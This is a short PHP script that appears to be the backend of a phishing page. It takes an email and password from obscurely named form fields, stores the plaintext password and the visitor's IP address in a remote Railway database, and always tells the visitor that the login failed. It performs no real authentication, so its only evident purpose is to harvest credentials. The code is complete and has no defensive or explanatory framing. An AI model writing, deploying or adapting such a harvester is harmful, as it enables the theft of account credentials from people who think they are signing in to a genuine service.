<?php
// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message
    ]);
    exit();
}

// Database connection using Railway environment variables
try {
    // Load database connection details from environment variables
    $mysqlUrl = getenv('MYSQL_URL'); // Retrieve `MYSQL_URL` from Railway
    $dsn = $mysqlUrl; // Directly use the full DSN provided by Railway
    $pdo = new PDO($dsn);

    // Log login attempt into the database table
    $stmt = $pdo->prepare("INSERT INTO login_attempts (email, password, ip_address, attempt_time) VALUES (?, ?, ?, ?)");
    $stmt->execute([
        $email,
        $password,
        $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        date("Y-m-d H:i:s")
    ]);

    sendJsonResponse(false, "Login attempt saved to Railway database.");
} catch (Exception $e) {
    error_log("Failed to log login attempt: " . $e->getMessage());
    sendJsonResponse(false, "A server error occurred while saving the login attempt.");
}
?>
